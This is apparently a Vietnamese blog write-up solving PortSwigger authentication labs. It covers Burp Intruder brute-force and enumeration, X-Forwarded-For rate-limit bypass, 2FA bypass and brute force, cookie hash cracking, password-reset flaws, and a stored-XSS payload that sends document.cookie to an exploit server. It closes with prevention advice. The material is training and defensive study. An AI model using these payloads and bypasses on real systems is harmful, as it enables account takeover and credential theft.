---
title: "[PortSwigger Lab] - Authentication Vulnerabilities"
description: Solution of Authentication Vulnerabilities on PortSwigger Lab
date: 2025-06-08 23:46:00 +0700
categories: [Cyber ​​Security, Web Pentest]
tags: [portswigger, burpsuite, labs, web, vulnerability, authentication]   
pin: false
comments: true
image:
    path: https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/imgs/posts/2025-06-08-portswigger-lab-authentication-vulnerabilities/authentication.png
    alt: Authentication Vulnerabilities
---

## Introduction
---
### **Authentication vulnerabilities**
**Authentication vulnerabilities** là những điểm yếu trong cơ chế xác thực **(authentication)** của một hệ thống, cho phép kẻ tấn công truy cập trái phép vào dữ liệu hoặc chức năng nhạy cảm.

Mặc dù khái niệm này khá dễ hiểu, nhưng hậu quả của chúng thường nghiêm trọng, bởi vì xác thực là tuyến phòng thủ đầu tiên giữa người dùng và hệ thống. Nếu bị phá vỡ, kẻ tấn công có thể:
- Chiếm quyền truy cập vào tài khoản người dùng.
- Truy cập dữ liệu riêng tư hoặc thực hiện các hành động trái phép.
- Mở rộng tấn công vào các thành phần khác trong hệ thống.

### **Authentication** and **Authorization**

| **Authentication**                | **Authorization**                        |
| --------------------------------- | ---------------------------------------- |
| Xác minh **bạn là ai**            | Xác minh **bạn được phép làm gì**        |
| Ví dụ: kiểm tra username/password | Ví dụ: bạn có được truy cập admin panel? |
| Xảy ra **trước** authorization    | Xảy ra **sau** khi xác thực thành công   |

## Solve Authentication Vulnerabilities Lab
---
### Lab: Username enumeration via different responses
- Thực hiên đăng nhập và gửi request đăng nhập đến **Burp Intruder**
```http
POST /login HTTP/2
Host: 0a4b003c0465c7a780418a9a00180028.web-security-academy.net
...
username=u&password=p
```
- Chọn mode **Cluster bomb attack** để thực hiện tấn công tổ hợp
- Add tại `u` và `p`
- Tại `u` chọn **Simple list** và **paste** danh sách **username** được cấp
- Tại `p` chọn **Simple list** và **paste** danh sách **password** được cấp
- Quan sát, request trả về status code **302** là request chứa **username** và **password** chính xác
- Đăng nhập 

### Lab: Username enumeration via subtly different responses
- Thực hiên đăng nhập và gửi request đăng nhập đến **Burp Intruder**
- Quan sát ta thấy đối đăng nhập không hợp lệ sẽ trả về thông báo lỗi `Invalid username or password.`
```http
POST /login HTTP/2
Host: 0a4b003c0465c7a780418a9a00180028.web-security-academy.net
...
username=u&password=p
```
- Chọn mode **Cluster bomb attack** để thực hiện tấn công tổ hợp
- Add tại `u` và `p`
- Tại `u` chọn **Simple list** và **paste** danh sách **username** được cấp
- Tại `p` chọn **Simple list** và **paste** danh sách **password** được cấp
- Tại tab **Grep - match** clear và past thông báo lỗi 
- Quan sát, request trả về chứa thông báo lỗi là request chứa **username** và **password** chính xác
- Đăng nhập 

### Lab: Username enumeration via response timing
#### Analysis
- Thực hiện chức năng login: 
    - Login bằng tài khoản được cấp
    - Login bằng tài khoản sai
- Thời gian **repsponse** của tài khoản đúng lâu hơn tải khoản sai, vì khi sai không cần handle để gửi nhiều dữ liệu về
- Thử login bằng tài khoản sai nhiều lần, nhận được thông báo `You have made too many incorrect login attempts. Please try again in 30 minute(s).`
- Thêm header `X-Forwarded-For` với giá trị số ngấu nhiên => **bypass** được, do ứng dụng block request nhiều lần sai dựa trên IP
- `X-Forwarded-For` là header phổ biến nhất dùng để chỉ địa chỉ IP gốc của client khi request được gửi qua proxy hoặc load balancer. Có thể sửa giá trị này thành IP tùy ý để "giả mạo" IP gửi request, từ đó vượt qua giới hạn **brute-force** dựa trên IP.

#### Exploit
- Ý tưởng: Sử dụng **Burp Intruder** để tấn công, ta sẽ tìm **username** trước, sau đó sẽ tìm **password**
- Gửi request `/login` đến **Burp Intruder**
- Thêm header `X-Forwarded-For`
```http
POST /login HTTP/2
Host: 0af400180386974980b049b9004100d5.web-security-academy.net
X-Forwarded-For: 1
...
username=u&password=p
```
- Tìm **username**
    - Add tại `1` và `u`
    - Chọn mode `Pitchfork` để tấn công song song theo danh sách
    - Tại `u`, chọn **Simple list** và **paste** danh sách **username** được cấpsố lượng từ 
    - Tại `1`, chon **Numbers** với số lượng bằng với số lượng từ khóa trong `u`, step 1
    - Đặt **password** cực kì dài để ứng dụng băm nó ra, so sánh với **password** trong **database** dẫn đến **response time** lớn, giúp dễ phân biệt
    - Start attack, tìm đến request có **response time** lớn nhất, thì đó chính là tài khoản
- Tìm **password**
    - Tương tự như trên nhưng ta add ở `1` và `p`
    - Start attack, quan sát request trả về status code **302** là request chứa **username** và **password** chính xác
- Đăng nhập 

### Lab: Broken brute-force protection, IP block
#### Analysis
- Login với tài khoản `wiener` và gửi tới **Burp Repeater**, và logout
- Login với tài khoản `carlos` với mật khẩu ngẫu nhiên và gửi tới **Burp Repeater**
- Login với tài khoản `carlos` nhiều lần với mật khẩu ngẫu nhiên, đến lần thứ 4 ta thấy đã bị block trong 1p
- Chờ hết thời gian 1p, login bằng tài khoản `carlos` 2 lần với mật khẩu ngẫu nhiên, lần thứ 3 login bằng tài khoản `wiener`, sau đó login lại bằng tài khoản `carlos` với mật khẩu ngẫu nhiên => Không bị block nữa
- Cho thấy ứng dụng sẽ không block địa chỉ **IP** nếu login lần 3 thành công

#### Exploit
- Ý tưởng: Tạo danh sách **username** và **password** tương ứng sau 2 lần login bằng tài khoản `carlos` sẽ login bằng tài khoản `wiener` rồi tiếp tuc login 2 lần bằng tài khoản `carlos`

```python
with open("passwords.txt", "r") as f:
    lines = f.read().splitlines()

with open("passwords_custom.txt", "w") as p, open("usernames_custom.txt", "w") as u:
    for i, line in enumerate(lines):
        p.write(f"{line}\n")
        u.write("carlos\n")
        if (i + 1) % 2 == 0:
            p.write("peter\n")
            u.write("wiener\n")
```
- Sử dụng code trên để tạo danh sách **username** và **password** dựa trên danh sách **password** có sẵn

```http
POST /login HTTP/2
Host: 0af100c2043a683a8071e941009a00bd.web-security-academy.net
...
username=u&password=p
```
- Gửi request đến **Burp Intruder**
- Add ở vị trí `u` và `p` 
- Chọn mode `Pitchfork` để tấn công song song theo danh sách
- Nếu sử dụng bản **BurpSuite Pro**, cần phải chỉnh **resource pool** với **concurrent** là 1 để các request được thực hiện tuyến tính, đúng với quy trình quét
- Xóa `u` và `p` đi để nó bỏ qua, vì request đầu tiên chứa `u` và `p` dẫn đễ logic không hợp lý
- Start atack, kiểm tra request có tên `carlos` và có length nhỏ thì chính là tài khoản của `carlos`
- Login

### Lab: Username enumeration via account lock
#### Analysis
- Đăng nhập và gửi request tới **Burp Intruder**

```http
POST /login HTTP/2
Host: 0af100c2043a683a8071e941009a00bd.web-security-academy.net
...
username=u&password=p
```
- Add tại vị trí `u` và `p`
- Lấy danh sách username và password được cấp và thực hiện tấn công ở mode **Clustor boom attack**
- Quan sát ta thấy request nào chứa response dưới đây tức tài khoản này tồn tại, vì vậy ứng dụng mới block nó sau nhiều lần gửi request login bằng tài khoản đó.

```
You have made too many incorrect login attempts. Please try again in 1 minute(s).
```
#### Exploit
- Dùng request trên nhưng add tại `p`, vì ta đã biết username là ai
- Thực hiện tấn công với danh sách password được cấp với mode **Snifer attack**
- Login 

### Lab: 2FA simple bypass
- Login bằng tài khoản `wiener` => yêu cầu **code** từ email
- Bỏ qua bước nhập code và truy cập đến `my-account` => Thành công
- Làm tương tự như vậy đối với tài khoản `carlos`
- Nguyên lý hoạt động: Ứng dụng cho phép truy cập tài nguyên mà không cần hoàn thành xác thực thứ hai

### Lab: 2FA broken logic
#### Analysis
- Login bằng tài khoản `wiener`, nhập `verify-code`
- Quan sát request, ta thấy request phụ thuộc vào trường `verify` trong header **Cookie**

```http
GET /login2 HTTP/2
Host: 0a1000b503cdf8ae82d4037d0021007a.web-security-academy.net
Cookie: verify=wiener; session=z1mE0Vpv9LKKQupoIHOWDdtortqphUpO
```
- Thay `wiener` bằng `carlos` và gửi lại request, chọn tab `render` của response để dễ quan sát, ta thấy được yêu cầu nhập mã 
- Đây là yêu cầu nhập mã của user `carlos` tức đã có mã gửi về mail `carlos`
- Quan sát hành vi của `verify-code`, nó giới hạn ở 4 ký tự số => ta có thể brute-force để **bypass** `verify-code`

#### Exploit
- Gửi request submit `verify-code` đến **Burp Intruder**

```http
POST /login2 HTTP/2
Host: 0a1000b503cdf8ae82d4037d0021007a.web-security-academy.net
Cookie: verify=carlos; session=z1mE0Vpv9LKKQupoIHOWDdtortqphUpO
...
mfa-code=1234
```
- Add tại `1234`
- Chọn mode **Snifer attack** với type burte-force:
    - **Character set**: `0123456789`
    - **Min length**: `4`
    - **Max length**: `4`
- Ta thử tất cả các chuỗi có độ dài cố định là 4 với **Character set** như trên
- Start attack, quan sát response có status code là `302`, chuột phải > **Show response in browser** hoặc **Request in browser**

### Lab: Brute-forcing a stay-logged-in cookie
#### Analysis
- Login bằng tài khoản `wiener` kết hợp **Stay logged on**
- Tìm request `/my-account`, ta thấy trường `stay-logged-in` được set trong **cookie**

```http
GET /my-account?id=wiener HTTP/2
Host: 0a4900e3032d6e9a8143addb009200a9.web-security-academy.net
Cookie: stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw; session=mZrf6FaliE6NBuZcCwyFHtC6YxTqHX3z
```
- Xóa `session` và gửi lại request => vẫn còn đăng nhập => cookie `stay-logged-in` được lưu để sử dụng lâu dài, có thể không cần cookie `session` vẫn ở trạng thái đã đăng nhập
- Thử logout và login lại bằng tài khoản `wiener` => cookie `stay-logged-in` vẫn như cũ => sử dụng chung 1 thuật toán tạo giá trị giống nhau
- Bôi đen giá trị `stay-logged-in`, nhìn sang tab **Inspector** > decode Base64 ta nhận được giá trị: `wiener:51dc30ddc473d43a6011e9ebba6ca770`
- Theo phỏng đoán thì đăng sau là password được mã hóa
- Sử dụng [Crackstation](https://crackstation.net/) để thử giải mã nó, kết quả nó là `peter`, password của username `wiener`, ngoài ra có thể làm ngược lại bằng cách băm `peter` theo các thuật toán khác nhau rồi so sánh với chuỗi `51dc30ddc473d43a6011e9ebba6ca770`
=> Thuật toán tạo nên `stay-logged-in`: **base64(username:md5(password))**

#### Exploit
- Gửi request đến **Burp Intruder**, thay id=`carlos`, bỏ cookie `session`

```http
GET /my-account?id=carlos HTTP/2
Host: 0a4900e3032d6e9a8143addb009200a9.web-security-academy.net
Cookie: stay-logged-in=stay;
```
- Chọn mode **Snifer attack**
- Add tại `stay` 
- Chọn payload type **Simple list** và paste danh sách **password** vào 
- **Payloads** > **Payload processing** > **Add rule** theo thử tự
    1. **Hash** > **MD5**: `md5(stay)`
    2. **Add prefix** > **carlos:**: `carlos:md5(stay)`
    3. **Encode** > **Base64**: `base64(username:md5(stay))`
- Start attack, quan sát request đúng > chuột phải > **Show response in browser** hoặc **Request in browser**

### Lab: Offline password cracking
#### Analysis
- Login bằng tài khoản `wiener` kết hợp **Stay logged on**
- Tìm request `/my-account`, ta thấy trường `stay-logged-in` được set trong **cookie**

```http
GET /my-account?id=wiener HTTP/2
Host: 0a4900e3032d6e9a8143addb009200a9.web-security-academy.net
Cookie: stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw; session=mZrf6FaliE6NBuZcCwyFHtC6YxTqHX3z
```
- Xóa `session` và gửi lại request => vẫn còn đăng nhập => cookie `stay-logged-in` được lưu để sử dụng lâu dài, có thể không cần cookie `session` vẫn ở trạng thái đã đăng nhập
- Thử logout và login lại bằng tài khoản `wiener` => cookie `stay-logged-in` vẫn như cũ => sử dụng chung 1 thuật toán tạo giá trị giống nhau
- Bôi đen giá trị `stay-logged-in`, nhìn sang tab **Inspector** > decode Base64 ta nhận được giá trị: `wiener:51dc30ddc473d43a6011e9ebba6ca770`
- Thuật toán mã hóa như lab trên: `base64(username:md5(password))`
- Xóa tài khoản `wiener` => yêu cầu mật khẩu nhưng không nhập
- Login bằng tài khoản `carlos` với mật khẩu bất kỳ nhiều lần => block 
- Không thể **burte-force** khi không có danh sách password sẵn
- Đã có thuật toán tạo nên cookie `stay-logged-in`. Vậy, chỉ cần lấy được nó từ người dùng là có được mật khẩu 

#### Exploit
- Đến một blog bất kỳ, thực hiện tấn công **XSS** => Thành công
- Tạo payload lấy cookie nạn nhân

```http
POST /post/comment HTTP/2
Host: 0aec005503720f598045a37000320093.web-security-academy.net
...
postId=8&comment=<script>
fetch("https://exploit-0a5300d903610f6f8082a2d2015e00b2.exploit-server.net/log?"+ document.cookie);
</script>&name=a&email=a@gmail.com&website=http://a.com
```

- Lấy cookie `stay-logged-in` từ **Exploit Server** và giải mã nó
- Truy cập **my-account** với `id=carlos` và `stay-logged-in` lấy được

```http
GET /my-account?id=carlos HTTP/2
Host: 0aec005503720f598045a37000320093.web-security-academy.net
Cookie: stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
```

- Thực hiện xóa tài khoản

### Lab: Password reset broken logic
#### Analysis
- Thử chức năng **forgot-password** với tài khoản `wiener`
- Truy cập vào đường dẫn được gửi về trong **email client** và thay đổi password

```http
POST /forgot-password?temp-forgot-password-token=bkxg2q8ye699i2jt1bjjoy2rgdkok9po HTTP/2
Host: 0afd00fb03351ecd809f7cb6003200f5.web-security-academy.net
...
temp-forgot-password-token=bkxg2q8ye699i2jt1bjjoy2rgdkok9po&username=wiener&new-password-1=a&new-password-2=a
```
- Quan sát ta thấy việc thay password phụ thuộc vào **temp-forgot-password-token** và param **username** có thể thay đổi được
- Thử thay đổi nhưng sử dụng **temp-forgot-password-token** không có thật => vẫn đổi được

#### Exploit
- Thay đổi username thành `carlos` với **temp-forgot-password-token** không có thật

```http
POST /forgot-password?temp-forgot-password-token=abc HTTP/2
Host: 0afd00fb03351ecd809f7cb6003200f5.web-security-academy.net
...
temp-forgot-password-token=abcegdh&username=carlos&new-password-1=a&new-password-2=a
```

- Đăng nhập bằng tài khoản `carlos` với password đã đổi

#### How it work?
- Website gửi một URL reset chứa token tạm thời dạng:

```
/forgot-password?temp-forgot-password-token=abc123...
```
- Nhưng khi người dùng gửi form đổi mật khẩu, server không kiểm tra giá trị token này.
- Điều đó có nghĩa: bất kỳ ai gửi yêu cầu **POST** đúng định dạng, với **username=target** đều có thể đổi được mật khẩu của người khác mà không cần **temp-forgot-password-token**.

### Lab: Password reset poisoning via middleware
Danh sách các header X-Forwarded- phổ biến

| Header               | Ý nghĩa                        | Ví dụ                              |
| -------------------- | ------------------------------ | ---------------------------------- |
| `X-Forwarded-For`    | IP gốc của client gửi request  | `X-Forwarded-For: 203.0.113.10`    |
| `X-Forwarded-Host`   | Host gốc mà client truy cập    | `X-Forwarded-Host: example.com`    |
| `X-Forwarded-Proto`  | Protocol gốc (http hoặc https) | `X-Forwarded-Proto: https`         |
| `X-Forwarded-Port`   | Cổng được sử dụng ban đầu      | `X-Forwarded-Port: 443`            |
| `X-Forwarded-Server` | Tên máy chủ xử lý request      | `X-Forwarded-Server: my-server-01` |

#### Analysis
- Forgot password với username `wiener`
- Quan sát nội dung trong **Email client** 

```
https://0a95000604ff46c1808353c700fc006b.web-security-academy.net/forgot-password?temp-forgot-password-token=3q9g73mu0ox2x9iz0wyu3fctn2bxtcn1
```

- Gửi request forgot password đến **Burp Repeater**
- Gửi lại request bổ sung header **X-Forwarded-Host** với giá trị là url của **Exploit Server**

```http
POST /forgot-password HTTP/2
Host: 0a95000604ff46c1808353c700fc006b.web-security-academy.net
X-Forwarded-Host: exploit-0aa100f8049146298038523301630081.exploit-server.net
...
username=wiener
```

- Thấy link đính kèm email sẽ trở thành đường dẫn của **Exploit Server**

```
https://exploit-0aa100f8049146298038523301630081.exploit-server.net/forgot-password?temp-forgot-password-token=7zj8gpafxtg9aejd9y99qh91j4kui1jt
```

#### Exploit
- Thực hiện forgot password với username `carlos` để ứng dụng gửi mail về `carlos` 
- Khi `carlos` click vào đường dẫn đã bị thao túng, tức sẽ gửi **temp-forgot-password-token** đến **Exploit Server**
- Vào **log** trong **Exploit Server** vào truy cập vào `orgot-password?temp-forgot-password-token=carlos-token` để thay đổi mật khẩu
- Login bằng tài khoản của `carlos`

## Prevent
---
### 1. Protect User Credentials
Ngay cả khi bạn có cơ chế xác thực rất mạnh, nếu bạn vô tình tiết lộ thông tin đăng nhập cho kẻ tấn công, toàn bộ hệ thống sẽ bị nguy hiểm. Luôn sử dụng HTTPS và chuyển hướng tất cả các kết nối HTTP sang HTTPS. Ngoài ra, hãy kiểm tra kỹ để không rò rỉ tên người dùng hoặc email qua phản hồi HTTP hoặc giao diện công khai.

### 2. Don’t Rely on Users for Security
Người dùng thường chọn cách dễ nhất, kể cả khi điều đó không an toàn. Bạn cần ép buộc hành vi an toàn thông qua chính sách mật khẩu hiệu quả. Thay vì dùng quy tắc phức tạp, hãy dùng công cụ đánh giá mật khẩu như `zxcvbn` để người dùng thấy được mức độ an toàn theo thời gian thực.

### 3. Prevent Username Enumeration
Đừng để kẻ tấn công đoán xem tài khoản nào tồn tại trong hệ thống bằng cách hiển thị thông báo lỗi khác nhau. Luôn trả về thông báo và mã trạng thái giống nhau, bất kể người dùng nhập đúng hay sai tên tài khoản.

### 4. Implement Brute-force Protection
Cần giới hạn số lần thử đăng nhập sai dựa trên IP hoặc thiết bị. Sau một số lần thất bại, hãy yêu cầu CAPTCHA. Mục tiêu là làm cho quá trình brute-force trở nên tốn thời gian và công sức để kẻ tấn công bỏ cuộc.

### 5. Audit Your Verification Logic
Lỗi logic trong quy trình xác thực có thể dẫn đến hậu quả nghiêm trọng. Hãy kiểm tra kỹ mọi nhánh điều kiện, đảm bảo không có cách nào bỏ qua bước xác thực.

### 6. Don’t Forget Supplementary Functionality
Đừng chỉ bảo vệ trang đăng nhập chính. Các tính năng như quên mật khẩu, đổi mật khẩu, đăng ký cũng là bề mặt tấn công cần được bảo vệ nghiêm ngặt tương đương.

### 7. Implement Proper Multi-factor Authentication
MFA là cách hiệu quả để tăng bảo mật. Không nên chỉ dùng xác thực qua email. Ưu tiên sử dụng ứng dụng tạo mã (TOTP) hoặc thiết bị vật lý. Tránh dùng SMS nếu có thể do rủi ro SIM swap. Và quan trọng: logic MFA cũng phải được kiểm tra kỹ để tránh bị bypass.


---
Goodluck! 🍀🍀🍀 
